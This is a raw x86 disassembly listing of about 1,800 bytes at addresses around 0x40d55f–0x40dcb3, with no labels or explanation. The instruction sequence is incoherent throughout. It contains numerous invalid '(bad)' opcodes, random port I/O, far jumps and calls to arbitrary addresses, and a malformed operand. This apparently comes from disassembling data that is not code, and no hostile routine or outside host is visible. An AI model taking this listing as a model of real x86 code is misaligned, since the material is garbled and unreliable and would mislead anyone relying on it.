  40d55f:	hlt    
  40d560:	pop    edi
  40d561:	mov    bh,0x5
  40d563:	cmp    DWORD PTR [ebx+eax*8+0x49],edx
  40d567:	rol    dl,cl
  40d569:	stos   BYTE PTR es:[edi],al
  40d56a:	or     DWORD PTR [ecx],0xffffffd1
  40d56d:	retf   0x357e
  40d570:	js     0x40d4f6
  40d572:	adc    esi,DWORD PTR [ebx+ebx*2]
  40d575:	call   0x383cc52
  40d57a:	or     BYTE PTR [esi],ch
  40d57c:	push   0x30
  40d57e:	and    al,BYTE PTR [ebx-0x3a]
  40d581:	dec    esi
  40d582:	jmp    0x392d50f3
  40d587:	xchg   ebx,eax
  40d588:	sub    eax,0x798046e4
  40d58d:	daa    
  40d58e:	jle    0x40d513
  40d590:	dec    esi
  40d591:	fs mov bh,0xed
  40d594:	cmovle ebp,edi
  40d597:	aas    
  40d598:	mov    esp,0x98cd4f5f
  40d59d:	es inc eax
  40d59f:	popa   
  40d5a0:	sbb    ebx,DWORD PTR [ecx]
  40d5a2:	dec    esi
  40d5a3:	xor    edi,esi
  40d5a5:	xor    esp,DWORD PTR [ecx-0x2f79cf29]
  40d5ab:	repnz mov ds:0xf03fded3,eax
  40d5b1:	fnstsw WORD PTR [eax]
  40d5b3:	lock mov DWORD PTR [esi-0x73a4c8a3],esi
  40d5ba:	sti    
  40d5bb:	mov    esp,0x7e3c418e
  40d5c0:	outs   dx,DWORD PTR ds:[esi]
  40d5c1:	rcr    al,cl
  40d5c3:	aas    
  40d5c4:	cmp    al,0xa7
  40d5c6:	out    0xb5,eax
  40d5c8:	mov    cl,0x2d
  40d5ca:	xor    eax,0xc92d2977
  40d5cf:	pop    edi
  40d5d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5d1:	or     eax,0x736de3a9
  40d5d6:	ss test eax,0xd1523bb9
  40d5dc:	adc    eax,0xdc4b12f2
  40d5e1:	clc    
  40d5e2:	xchg   ecx,eax
  40d5e3:	inc    eax
  40d5e4:	jg     0x40d60b
  40d5e6:	lahf   
  40d5e7:	add    DWORD PTR [eax+0x1182dac8],ecx
  40d5ed:	push   ebp
  40d5ee:	fadd   st(2),st
  40d5f0:	jp     0x40d5a2
  40d5f2:	shr    DWORD PTR [eax+edi*2-0x68],cl
  40d5f6:	call   FWORD PTR [edx+edi*1]
  40d5f9:	push   ecx
  40d5fa:	in     eax,0x8d
  40d5fc:	push   es
  40d5fd:	mov    dh,0x0
  40d5ff:	jnp    0x40d646
  40d601:	sar    ch,cl
  40d603:	xlat   BYTE PTR ds:[ebx]
  40d604:	addr16 aad 0x5f
  40d607:	pusha  
  40d608:	sub    al,BYTE PTR [eax]
  40d60a:	adc    eax,0x43337afe
  40d60f:	sub    ebp,DWORD PTR [edx+ecx*8-0x3a62a33a]
  40d616:	out    0x9b,eax
  40d618:	and    BYTE PTR [ecx-0x5c],dh
  40d61b:	loope  0x40d658
  40d61d:	pop    edi
  40d61e:	or     bh,dh
  40d620:	loop   0x40d5f1
  40d622:	cvtdq2ps xmm6,XMMWORD PTR [esi-0x55]
  40d626:	jge    0x40d66c
  40d628:	xlat   BYTE PTR ds:[ebx]
  40d629:	pop    ds
  40d62a:	xchg   esp,eax
  40d62b:	bound  ebp,QWORD PTR ds:0x810a362e
  40d631:	imul   eax,DWORD PTR [eax+edi*2],0xc960346e
  40d638:	pop    esi
  40d639:	sub    BYTE PTR [ebx+0x4bd19db2],0xed
  40d640:	push   eax
  40d641:	cmp    DWORD PTR [eax],eax
  40d643:	aas    
  40d644:	xchg   esi,eax
  40d645:	xchg   edx,eax
  40d646:	inc    edi
  40d647:	out    0xd3,al
  40d649:	inc    edi
  40d64a:	sub    eax,0x23011536
  40d64f:	loope  0x40d67b
  40d651:	jl     0x40d6c0
  40d653:	mov    ds:0x36802ed7,eax
  40d658:	push   0xffffffc3
  40d65a:	int    0xb9
  40d65c:	sub    esi,DWORD PTR [esi]
  40d65e:	je     0x40d657
  40d660:	ins    BYTE PTR es:[edi],dx
  40d661:	stos   DWORD PTR es:[edi],eax
  40d662:	ret    0xbe21
  40d665:	dec    ebx
  40d666:	ror    DWORD PTR [edi+ebx*4-0x27],1
  40d66a:	mov    bh,0xd4
  40d66c:	adc    eax,0xf87b8bc
  40d671:	arpl   WORD PTR [esi-0x7168ad98],dx
  40d677:	add    BYTE PTR [eax-0x3809fe99],dh
  40d67d:	pop    eax
  40d67e:	jl     0x40d65e
  40d680:	mov    ebx,0xec4f2a54
  40d685:	stc    
  40d686:	jbe    0x40d65e
  40d688:	inc    ecx
  40d689:	inc    edi
  40d68a:	mov    ch,0xe8
  40d68c:	enter  0x3b6b,0x9d
  40d690:	dec    esp
  40d691:	jl     0x40d667
  40d693:	sub    al,0xd5
  40d695:	in     eax,dx
  40d696:	stos   BYTE PTR es:[edi],al
  40d697:	ins    BYTE PTR es:[edi],dx
  40d698:	mov    ds:0x4a92765a,al
  40d69d:	ror    BYTE PTR [ebp+0x1b693f90],1
  40d6a3:	out    0x31,al
  40d6a5:	aad    0x20
  40d6a7:	push   esp
  40d6a8:	cmp    BYTE PTR [eax+0xe9d76ae],bl
  40d6ae:	pop    ss
  40d6af:	(bad)  
  40d6b0:	adc    bl,BYTE PTR [esi-0x31a68097]
  40d6b6:	mov    al,ds:0x7aacd7de
  40d6bb:	hlt    
  40d6bc:	nop
  40d6bd:	scas   eax,DWORD PTR es:[edi]
  40d6be:	cmp    BYTE PTR [ebx+eax*8],ch
  40d6c1:	xor    BYTE PTR [edi+0x373553d6],bh
  40d6c7:	outs   dx,BYTE PTR ds:[esi]
  40d6c8:	mov    esi,0xd0b7af1
  40d6cd:	(bad)  
  40d6ce:	push   ebx
  40d6cf:	pop    ecx
  40d6d0:	and    DWORD PTR [esi-0x69069875],ebx
  40d6d6:	fsubr  QWORD PTR [ebx-0xf9b99c]
  40d6dc:	mov    cl,0xfb
  40d6de:	outs   dx,DWORD PTR ds:[esi]
  40d6df:	mov    eax,ds:0xe498d4da
  40d6e4:	in     al,dx
  40d6e5:	arpl   ax,bx
  40d6e7:	ss js  0x40d70a
  40d6ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6eb:	push   cs
  40d6ec:	and    al,0x96
  40d6ee:	jo     0x40d689
  40d6f0:	push   ecx
  40d6f1:	das    
  40d6f2:	lea    eax,[ebp+0x44]
  40d6f5:	dec    ebx
  40d6f6:	xor    al,0x6c
  40d6f8:	sub    DWORD PTR [ebx],ebp
  40d6fa:	push   edx
  40d6fb:	push   ebx
  40d6fc:	add    al,0x38
  40d6fe:	sub    DWORD PTR [ecx+0x3a],edi
  40d701:	pop    edi
  40d702:	xor    BYTE PTR [esi],al
  40d704:	pop    edi
  40d705:	and    edx,ebx
  40d707:	adc    eax,0xd794f934
  40d70c:	jmp    0x23ec:0xff078ea0
  40d713:	jecxz  0x40d6ab
  40d715:	sbb    eax,0xa633f9fb
  40d71a:	pop    edi
  40d71b:	adc    BYTE PTR [ebp-0x65],ah
  40d71e:	in     eax,0x47
  40d720:	xor    al,0xb2
  40d722:	out    dx,al
  40d723:	dec    esp
  40d724:	stc    
  40d725:	or     al,0x4c
  40d727:	arpl   WORD PTR [ebx-0xa32cd58],ax
  40d72d:	outs   dx,BYTE PTR ds:[esi]
  40d72e:	loop   0x40d713
  40d730:	in     al,0x0
  40d732:	mov    ecx,0xea600f73
  40d737:	leave  
  40d738:	int3   
  40d739:	push   ds
  40d73a:	sub    dh,BYTE PTR [edx+ebp*2]
  40d73d:	aam    0x3c
  40d73f:	loopne 0x40d6f1
  40d741:	xor    BYTE PTR [eax+0x73],al
  40d744:	add    BYTE PTR [ebx+0x7dc612e9],cl
  40d74a:	ret    
  40d74b:	in     al,dx
  40d74c:	repz adc al,dl
  40d74f:	ins    BYTE PTR es:[edi],dx
  40d750:	int3   
  40d751:	test   eax,0xe976f8d4
  40d756:	call   0xcca75067
  40d75b:	sub    eax,eax
  40d75d:	or     al,0x4d
  40d75f:	and    edi,ebx
  40d761:	gs stos BYTE PTR es:[edi],al
  40d763:	(bad)  
  40d764:	dec    edi
  40d765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d766:	or     eax,0x2b92f05f
  40d76b:	test   BYTE PTR [ecx+0x5f],bh
  40d76e:	jl     0x40d711
  40d770:	pop    DWORD PTR [esp+esi*4]
  40d773:	aaa    
  40d774:	jecxz  0x40d769
  40d776:	repnz fwait
  40d778:	shl    esp,0x74
  40d77b:	sahf   
  40d77c:	ins    DWORD PTR es:[edi],dx
  40d77d:	xchg   edx,eax
  40d77e:	or     BYTE PTR [ebp*2+0x2e0db3c7],al
  40d785:	cmp    al,0xfd
  40d787:	imul   edi,DWORD PTR [ebp-0x6a0f0c18],0x36
  40d78e:	sbb    al,0xdf
  40d790:	rcr    al,cl
  40d792:	mov    al,0x9f
  40d794:	inc    ebp
  40d795:	fist   DWORD PTR [edi+ebx*4+0xc]
  40d799:	pop    edi
  40d79a:	not    DWORD PTR [edi+0x1b]
  40d79d:	and    ah,BYTE PTR [esi+0x79]
  40d7a0:	add    bl,BYTE PTR cs:[ecx-0x50]
  40d7a4:	data16 or al,0x8d
  40d7a7:	int    0x70
  40d7a9:	mov    edx,0x9dbe68c5
  40d7ae:	jns    0x40d770
  40d7b0:	mov    eax,ds:0xd1639aa5
  40d7b5:	pop    edi
  40d7b6:	dec    eax
  40d7b7:	jmp    0x6632:0xd695090d
  40d7be:	pop    es
  40d7bf:	rcl    DWORD PTR [ecx-0xaa9d4ae],0xc5
  40d7c6:	ret    0xb3f0
  40d7c9:	out    dx,eax
  40d7ca:	repz mov edx,0x7e69dcf5
  40d7d0:	push   edx
  40d7d1:	pop    es
  40d7d2:	js     0x40d7e1
  40d7d4:	outs   dx,DWORD PTR ds:[esi]
  40d7d5:	fisubr DWORD PTR [ebx+0x3e]
  40d7d8:	fisttp QWORD PTR [ebx]
  40d7da:	jb     0x40d75e
  40d7dc:	push   ss
  40d7dd:	cmp    al,0x67
  40d7df:	aam    0x99
  40d7e1:	dec    DWORD PTR ss:0x67ba298b
  40d7e8:	fnstenv [edi+0x5f3b0e2a]
  40d7ee:	fcmovu st,st(6)
  40d7f0:	mov    eax,0x57febdd2
  40d7f5:	add    al,0x39
  40d7f7:	pop    esp
  40d7f8:	xor    DWORD PTR ds:0xecb12dc7,edx
  40d7fe:	sbb    eax,0x242f8ae9
  40d803:	jo     0x40d7a5
  40d805:	or     BYTE PTR [esi+0x34a82a66],bh
  40d80b:	jge    0x40d7d6
  40d80d:	mov    cs,ebx
  40d80f:	cmc    
  40d810:	fnstcw WORD PTR [edx+0x4f6d28da]
  40d816:	mov    ecx,0x2ac64d1
  40d81b:	hlt    
  40d81c:	leave  
  40d81d:	xlat   BYTE PTR ds:[ebx]
  40d81e:	fcmove st,st(2)
  40d820:	pop    ebx
  40d821:	(bad)  
  40d822:	inc    ebp
  40d823:	clc    
  40d824:	clc    
  40d825:	ja     0x40d80d
  40d827:	daa    
  40d828:	das    
  40d829:	jne    0x40d899
  40d82b:	inc    esp
  40d82c:	and    BYTE PTR [ecx+esi*2],0x8c
  40d830:	pop    edi
  40d831:	scas   eax,DWORD PTR es:[edi]
  40d832:	sub    eax,0xeb80ac3a
  40d837:	add    al,0x28
  40d839:	mov    eax,ds:0x694c3b01
  40d83e:	pop    ebx
  40d83f:	push   ds
  40d840:	jmp    0x8dd06a6f
  40d845:	sub    bh,BYTE PTR [esi-0x60]
  40d848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d849:	mov    edi,0x3169b954
  40d84e:	clc    
  40d84f:	cmp    ebp,esi
  40d851:	dec    edx
  40d852:	push   edx
  40d853:	pusha  
  40d854:	or     al,BYTE PTR [eax-0x17473866]
  40d85a:	fsub   DWORD PTR [edx+edi*4]
  40d85d:	pusha  
  40d85e:	ja     0x40d896
  40d860:	jl     0x40d7f0
  40d862:	or     eax,0xc8fa33a9
  40d867:	call   0x4845:0x42375cca
  40d86e:	and    BYTE PTR [eax],0x84
  40d871:	mov    BYTE PTR [eax+ebx*4-0x576014f9],bh
  40d878:	pusha  
  40d879:	aas    
  40d87a:	cmp    ebp,DWORD PTR [esi+ebx*2]
  40d87d:	stos   BYTE PTR es:[edi],al
  40d87e:	imul   ebx,DWORD PTR [eax-0x707036cb],0xf0eeb3cc
  40d888:	push   ebp
  40d889:	inc    ebx
  40d88a:	cld    
  40d88b:	leave  
  40d88c:	adc    eax,0x1760ac05
  40d891:	add    al,0xdf
  40d893:	test   DWORD PTR [ebx-0x11],0x41e09be9
  40d89a:	je     0x40d85c
  40d89c:	(bad)  
  40d89e:	push   cs
  40d89f:	jmp    0x40d826
  40d8a1:	mov    bl,0x69
  40d8a3:	scas   al,BYTE PTR es:[edi]
  40d8a4:	(bad)  
  40d8a5:	cli    
  40d8a6:	in     eax,0x67
  40d8a8:	popf   
  40d8a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8aa:	cmp    BYTE PTR [eax],bl
  40d8ac:	fst    DWORD PTR [ebx-0x6]
  40d8af:	pop    ebx
  40d8b0:	pop    ecx
  40d8b1:	xor    dl,BYTE PTR [edx]
  40d8b3:	shr    BYTE PTR [edi+0x10],1
  40d8b6:	add    DWORD PTR [ecx-0x6bb6ce8c],ebx
  40d8bc:	es (bad) 
  40d8be:	out    dx,al
  40d8bf:	cmp    bl,BYTE PTR [ebx]
  40d8c1:	outs   dx,BYTE PTR ds:[esi]
  40d8c2:	call   0x269fa92f
  40d8c7:	xchg   ecx,eax
  40d8c8:	nop
  40d8c9:	cmp    al,0x8b
  40d8cb:	cmc    
  40d8cc:	call   0x299d2c73
  40d8d1:	mov    eax,ds:0xe07d08e1
  40d8d6:	ja     0x40d932
  40d8d8:	jecxz  0x40d89e
  40d8da:	jl     0x40d8df
  40d8dc:	xchg   DWORD PTR [edi-0x4ec6bfab],edx
  40d8e2:	or     DWORD PTR [esi+0x62],esi
  40d8e5:	shl    DWORD PTR [edx+esi*1+0x5],0x5b
  40d8ea:	out    dx,al
  40d8eb:	lods   eax,DWORD PTR ds:[esi]
  40d8ec:	mov    cl,0x6c
  40d8ee:	pop    ebx
  40d8ef:	sti    
  40d8f0:	mov    ds:0x14795f48,eax
  40d8f5:	mov    ah,BYTE PTR [ebx-0x325785b6]
  40d8fb:	dec    ebx
  40d8fc:	jb     0x40d963
  40d8fe:	out    dx,al
  40d8ff:	les    esp,FWORD PTR [esi+edi*2-0x1fa11506]
  40d906:	ret    0x44a9
  40d909:	out    0x65,al
  40d90b:	jne    0x40d928
  40d90d:	ja     0x40d92b
  40d90f:	mov    bl,0x4e
  40d912:	or     esi,edi
  40d914:	fucomip st,st(1)
  40d916:	xor    bh,ch
  40d918:	pop    ds
  40d919:	lahf   
  40d91a:	and    DWORD PTR [eax-0x7],0x82f2f9f2
  40d921:	shl    BYTE PTR ss:[esi+eiz*8-0x2],0x56
  40d927:	add    BYTE PTR [edx-0x5a0644a1],cl
  40d92d:	repz mov bl,BYTE PTR [esp+edi*4-0x1b]
  40d932:	iret   
  40d933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d934:	sub    eax,0x8dc54c9f
  40d939:	sahf   
  40d93a:	cs push esp
  40d93c:	lds    esp,FWORD PTR [edi]
  40d93e:	shl    BYTE PTR [edi],cl
  40d940:	stc    
  40d941:	in     eax,0x6f
  40d943:	ins    DWORD PTR es:[edi],dx
  40d944:	(bad)
  40d947:	jg     0x40d91c
  40d949:	sbb    DWORD PTR [esi+0x6d],ebx
  40d94c:	dec    esp
  40d94d:	sbb    al,0x93
  40d94f:	mov    ds:0x148b30ea,eax
  40d954:	xchg   esi,eax
  40d955:	push   esp
  40d956:	adc    al,0x62
  40d958:	into   
  40d959:	sub    eax,0xad50df92
  40d95e:	shl    BYTE PTR [edi+0x1c],cl
  40d961:	jge    0x40d99e
  40d963:	popa   
  40d964:	sti    
  40d965:	add    eax,0x652220c3
  40d96a:	xor    al,BYTE PTR [eax+eax*4]
  40d96d:	ins    BYTE PTR es:[edi],dx
  40d96e:	push   edi
  40d96f:	sub    BYTE PTR [ecx],al
  40d971:	out    dx,al
  40d972:	mov    ah,BYTE PTR [ebx-0x71]
  40d975:	mov    eax,ds:0xb1e26c0e
  40d97a:	add    esi,edx
  40d97c:	cmp    cl,BYTE PTR [edi+ebx*8]
  40d97f:	(bad)  
  40d980:	fwait
  40d981:	stos   BYTE PTR es:[edi],al
  40d982:	std    
  40d983:	mov    ds:0x5e89a4f3,eax
  40d988:	sti    
  40d989:	jno    0x40d979
  40d98b:	test   BYTE PTR cs:[eax],0xf8
  40d98f:	push   ebp
  40d990:	test   al,0xa9
  40d992:	lock xchg ebx,eax
  40d994:	inc    edx
  40d995:	jg     0x40d9ad
  40d997:	xchg   al,cl
  40d999:	jmp    ebx
  40d99b:	sbb    bh,cl
  40d99d:	add    al,0xc3
  40d99f:	mov    eax,0x5cbc4df2
  40d9a4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40d9a6:	jnp    0x40d987
  40d9a8:	push   edi
  40d9a9:	mov    dh,0x2c
  40d9ab:	mov    ecx,0x9b0721
  40d9b0:	add    BYTE PTR [ebx+0x12],bh
  40d9b3:	xor    bh,BYTE PTR [eax-0x2e560249]
  40d9b9:	dec    esi
  40d9ba:	pop    ss
  40d9bb:	or     DWORD PTR ds:0xf86bd3bc,edx
  40d9c1:	jno    0x40d970
  40d9c3:	and    ecx,DWORD PTR [ecx-0x7b]
  40d9c6:	xor    BYTE PTR [eax+0x1c33415],ah
  40d9cc:	arpl   WORD PTR [ecx-0x69],bp
  40d9cf:	out    dx,al
  40d9d0:	outs   dx,BYTE PTR ds:[esi]
  40d9d1:	cmp    DWORD PTR [ebp+0x1],edi
  40d9d4:	xchg   esi,eax
  40d9d5:	xchg   esp,eax
  40d9d6:	arpl   WORD PTR [edx+0x50ec7dcd],bx
  40d9dc:	add    al,0x32
  40d9de:	in     al,0x1e
  40d9e0:	fidivr DWORD PTR [ebx-0x55]
  40d9e3:	loope  0x40d9fc
  40d9e5:	sub    DWORD PTR [ebp+0x7cac90ab],eax
  40d9eb:	push   esp
  40d9ec:	nop
  40d9ed:	lds    esp,FWORD PTR [edi-0x26]
  40d9f0:	test   DWORD PTR [edi+ebp*1],0xbd40e129
  40d9f7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40d9f9:	sbb    ebx,eax
  40d9fb:	adc    BYTE PTR [ebx],ch
  40d9fd:	xor    eax,0xf2c0616c
  40da02:	sbb    esi,DWORD PTR ds:[edx]
  40da05:	aam    0x23
  40da07:	stos   BYTE PTR es:[edi],al
  40da08:	movnti DWORD PTR [edx],ecx
  40da0b:	lea    ebx,[esi+0x2d8c2b0b]
  40da11:	loop   0x40d9eb
  40da13:	push   ebx
  40da14:	and    eax,0x39ea73af
  40da19:	jae    0x40da5a
  40da1b:	das    
  40da1c:	sub    dl,BYTE PTR [ebp+0x50710c7a]
  40da22:	rcl    BYTE PTR [esi-0x6734bdc6],1
  40da28:	xchg   ebp,eax
  40da29:	fnstsw WORD PTR [esi+0x50925b6a]
  40da2f:	ja     0x40d9c4
  40da31:	outs   dx,DWORD PTR ds:[esi]
  40da32:	je     0x40da1e
  40da34:	into   
  40da35:	das    
  40da36:	or     al,0x3d
  40da38:	adc    esp,DWORD PTR [ecx]
  40da3a:	mov    ch,0x28
  40da3c:	es into 
  40da3e:	lods   al,BYTE PTR ds:[esi]
  40da3f:	xor    esi,0x67
  40da42:	dec    edi
  40da43:	dec    esi
  40da44:	mov    ds:0xb7e3eeb6,eax
  40da49:	mov    ch,0x8e
  40da4b:	push   ss
  40da4c:	pop    esp
  40da4d:	cmp    al,0xc0
  40da4f:	xor    DWORD PTR [eax],esp
  40da51:	add    DWORD PTR [edx+ebp*2-0x5c],0xffffff9d
  40da56:	mov    ebx,DWORD PTR [edx-0xfa382f]
  40da5c:	rol    BYTE PTR [eax],0xe4
  40da5f:	sti    
  40da60:	stc    
  40da61:	jo     0x40da40
  40da63:	push   ebx
  40da64:	xor    al,0xed
  40da66:	aad    0xb5
  40da68:	or     ah,cl
  40da6a:	push   eax
  40da6b:	bound  ebx,QWORD PTR [ecx]
  40da6d:	repnz mov cl,0x84
  40da70:	lods   eax,DWORD PTR ds:[esi]
  40da71:	jmp    0x40da7e
  40da73:	(bad)  
  40da75:	adc    dh,BYTE PTR [edi]
  40da77:	sar    BYTE PTR [ebx],cl
  40da79:	cmp    esi,ebp
  40da7b:	lock retf 
  40da7d:	ins    BYTE PTR es:[edi],dx
  40da7e:	jg     0x40da8b
  40da80:	sub    BYTE PTR [esi],0x60
  40da83:	and    BYTE PTR [edx+0x2d08fed9],bh
  40da89:	adc    bl,BYTE PTR [ebx-0x7c415c34]
  40da8f:	arpl   WORD PTR [ecx+0x15],di
  40da92:	(bad)  [esi-0x59]
  40da95:	mov    ah,0xbc
  40da97:	add    al,0xf9
  40da99:	std    
  40da9a:	out    dx,eax
  40da9b:	adc    bl,BYTE PTR [eax+0x64a7f196]
  40daa1:	popa   
  40daa2:	xchg   edx,eax
  40daa3:	mov    eax,ds:0x76d3ff38
  40daa8:	cmp    eax,0xe96b1d0c
  40daad:	mov    edx,esp
  40daaf:	or     BYTE PTR [eax+eax*2+0x21],ch
  40dab3:	cmp    BYTE PTR [ebp+edi*8-0x21],cl
  40dab7:	push   es
  40dab8:	push   edx
  40dab9:	cmp    al,BYTE PTR [edx+ebp*2+0x76eea5c6]
  40dac0:	pusha  
  40dac1:	fld    TBYTE PTR [eax+0x46]
  40dac4:	dec    eax
  40dac5:	call   0x90794fe4
  40daca:	lods   eax,DWORD PTR ds:[esi]
  40dacb:	int3   
  40dacc:	loop   0x40daa2
  40dace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dacf:	and    al,0x6f
  40dad1:	push   ds
  40dad2:	push   ebx
  40dad3:	mov    dh,0x5b
  40dad5:	(bad)  
  40dad6:	aad    0x58
  40dad8:	cwde   
  40dad9:	dec    eax
  40dada:	mov    bl,0xa7
  40dadc:	(bad)  
  40dadd:	mov    cs,WORD PTR [edx+0x3fe6ecc1]
  40dae3:	cmp    bh,BYTE PTR [esi+edx*4]
  40dae6:	pop    edx
  40dae7:	mov    bl,0xa4
  40dae9:	jp     0x40dab7
  40daeb:	pop    edx
  40daec:	shl    BYTE PTR [ecx+0x31],1
  40daef:	or     al,0x48
  40daf1:	jno    0x40dadd
  40daf3:	sub    bl,dh
  40daf5:	nop
  40daf6:	ret    0x5331
  40daf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dafa:	pop    ds
  40dafb:	sti    
  40dafc:	jmp    0xdfc1c681
  40db01:	sbb    al,0xcb
  40db03:	ror    BYTE PTR [edi+eiz*1+0x0],cl
  40db07:	inc    ebp
  40db08:	xchg   BYTE PTR [eax+0x609d29c7],ah
  40db0e:	cmp    BYTE PTR [ebx],cl
  40db10:	ins    DWORD PTR es:[edi],dx
  40db11:	mov    bl,0xc5
  40db13:	imul   esp,DWORD PTR [edi],0x95d308dd
  40db19:	mov    ds:0x6fa3c6ad,al
  40db1e:	lds    ecx,FWORD PTR [eax+0x58]
  40db21:	xchg   edi,eax
  40db22:	and    al,0xf8
  40db24:	mov    bl,0xba
  40db26:	mov    ?,edi
  40db28:	fdivr  st,st(6)
  40db2a:	xchg   BYTE PTR [eax-0x4d],bl
  40db2d:	xor    DWORD PTR [edi-0x22d531c2],esi
  40db33:	cmp    cl,bh
  40db35:	(bad)  
  40db37:	fist   DWORD PTR [ebp+0x2d]
  40db3a:	imul   edi,ebx,0xf6cc40a3
  40db40:	mov    ah,0xf
  40db42:	popf   
  40db43:	scas   eax,DWORD PTR es:[edi]
  40db44:	xchg   edi,eax
  40db45:	mov    esi,0x297ca3bf
  40db4a:	and    al,0x9e
  40db4c:	leave  
  40db4d:	retf   0x9ec
  40db50:	xor    DWORD PTR [edi+0x239ee48d],ebp
  40db56:	jg     0x40db69
  40db58:	imul   BYTE PTR [ecx-0x4cd6b06d]
  40db5e:	add    DWORD PTR [edx+0x40],esi
  40db61:	pushf  
  40db62:	lock sbb BYTE PTR [eax],cl
  40db65:	sbb    ebp,ecx
  40db67:	test   al,0xdc
  40db69:	jo     0x40dbd9
  40db6b:	xchg   ebp,eax
  40db6c:	out    0x8f,eax
  40db6e:	stc    
  40db6f:	sbb    ebx,edx
  40db71:	jo     0x40dbc3
  40db73:	pop    eax
  40db74:	cmp    ch,BYTE PTR [esi+ecx*1]
  40db77:	push   DWORD PTR [eax]
  40db79:	imul   edx,DWORD PTR [ebx+0x7e],0x3868d9a5
  40db80:	mov    cl,BYTE PTR [eax]
  40db82:	stos   DWORD PTR es:[edi],eax
  40db83:	xchg   ebx,eax
  40db84:	jp     0x40db8e
  40db86:	in     al,dx
  40db87:	sbb    al,0xc8
  40db89:	fistp  QWORD PTR [ecx-0x6e]
  40db8c:	jg     0x40db75
  40db8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db8f:	dec    ebp
  40db90:	in     eax,dx
  40db91:	add    eax,0x1e9fb48f
  40db96:	xchg   BYTE PTR [esi],ah
  40db98:	aas    
  40db99:	fild   QWORD PTR [ecx+ecx*2]
  40db9c:	jbe    0x40dbe3
  40db9e:	idiv   BYTE PTR [ebx-0x35fd6207]
  40dba4:	or     eax,0x6a0240f1
  40dba9:	xor    BYTE PTR ds:0xe51fa538,dh
  40dbaf:	jno    0x40dbdc
  40dbb1:	cmp    eax,0xa137bbc3
  40dbb6:	addr16 pop ss
  40dbb8:	outs   dx,DWORD PTR ds:[esi]
  40dbb9:	xlat   BYTE PTR ds:[ebx]
  40dbba:	fs ret 
  40dbbc:	mov    bh,0xe8
  40dbbe:	loope  0x40db89
  40dbc0:	or     eax,DWORD PTR [eax-0x14]
  40dbc3:	fbstp  TBYTE PTR [ecx]
  40dbc5:	mov    al,0x53
  40dbc7:	out    0xcc,al
  40dbc9:	xchg   BYTE PTR [eax],cl
  40dbcb:	out    dx,eax
  40dbcc:	dec    esp
  40dbcd:	and    eax,0x95e8d5a5
  40dbd2:	ret    
  40dbd3:	mov    BYTE PTR [esi+0x1c],dh
  40dbd6:	pop    edx
  40dbd7:	mov    al,ds:0xc33b4dbe
  40dbdc:	xchg   edx,eax
  40dbdd:	out    dx,eax
  40dbde:	(bad)  
  40dbdf:	adc    eax,0x1e188040
  40dbe4:	add    esp,edx
  40dbe6:	inc    eax
  40dbe7:	aas    
  40dbe8:	jmp    0x8b0d:0x9195ac09
  40dbef:	jle    0x40dbce
  40dbf1:	popa   
  40dbf2:	jl     0x40dba0
  40dbf4:	xor    cl,BYTE PTR [edi+0x3b325025]
  40dbfa:	xchg   esp,eax
  40dbfb:	mov    bl,0xf0
  40dbfd:	pop    esp
  40dbfe:	and    DWORD PTR [ebp+0x1058a6d0],esi
  40dc04:	jmp    0xdcbf6787
  40dc09:	inc    ebx
  40dc0a:	adc    eax,0x8169adf4
  40dc0f:	adc    BYTE PTR ds:0x5413884c,0x8f
  40dc16:	arpl   WORD PTR [ecx+0x7ac8c69],bp
  40dc1c:	out    dx,eax
  40dc1d:	cmp    eax,0x457383cc
  40dc22:	add    eax,esi
  40dc24:	xor    al,0x9d
  40dc26:	add    ebp,edi
  40dc28:	sub    BYTE PTR [edi-0x1f],bh
  40dc2b:	arpl   WORD PTR [ebp+eax*1-0x75fb5684],di
  40dc32:	add    al,0xd5
  40dc34:	inc    ecx
  40dc35:	clc    
  40dc36:	scas   al,BYTE PTR es:[edi]
  40dc37:	mov    ch,0xf0
  40dc39:	mov    ecx,edx
  40dc3b:	repz bound ebx,QWORD PTR [esi-0xbcdf49c]
  40dc42:	push   ebp
  40dc43:	retf   0x359c
  40dc46:	ret    
  40dc47:	dec    edi
  40dc48:	mov    ebp,0x100d293e
  40dc4d:	int3   
  40dc4e:	and    BYTE PTR [eax],0xa5
  40dc51:	pop    eax
  40dc52:	sahf   
  40dc53:	jno    0x40dc35
  40dc55:	jle    0x40dc22
  40dc57:	pop    ebx
  40dc58:	iret   
  40dc59:	mov    ds:0x82a03d4,eax
  40dc5e:	out    0xff,al
  40dc60:	and    DWORD PTR [ebx-0x6a],ecx
  40dc63:	stos   BYTE PTR es:[edi],al
  40dc64:	xchg   ebp,eax
  40dc65:	lods   al,BYTE PTR ds:[esi]
  40dc66:	imul   edx,DWORD PTR [ebp-0x54e3b59d],0x285aae9e
  40dc70:	sbb    edi,eax
  40dc72:	jae    0x40dcc2
  40dc74:	push   ss
  40dc75:	punpcklbw mm7,DWORD PTR [ebp-0x10fe8f97]
  40dc7c:	xchg   ebx,eax
  40dc7d:	cmp    bh,BYTE PTR [esi-0x6f]
  40dc80:	and    edi,DWORD PTR [eax-0x31000300]
  40dc86:	sbb    dh,BYTE PTR [edx-0x58]
  40dc89:	jo     0x40dc16
  40dc8b:	lods   eax,DWORD PTR ds:[esi]
  40dc8c:	(bad)
  40dc90:	jo     0x40dc40
  40dc92:	cld    
  40dc93:	inc    eax
  40dc94:	in     eax,0x2c
  40dc96:	pop    eax
  40dc97:	jb     0x40dcd1
  40dc99:	out    dx,al
  40dc9a:	test   BYTE PTR [edx+0x570c0fc9],0x74
  40dca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dca2:	mov    dh,0xf9
  40dca4:	stc    
  40dca5:	mov    bh,0x27
  40dca7:	jp     0x40dd0c
  40dca9:	pop    esi
  40dcaa:	in     eax,dx
  40dcab:	pop    ds
  40dcac:	pop    ecx
  40dcad:	inc    esi
  40dcae:	xchg   BYTE PTR [ebx-0x3b],dl
  40dcb1:	jns    0x40dd20
  40dcb3:	(bad)  
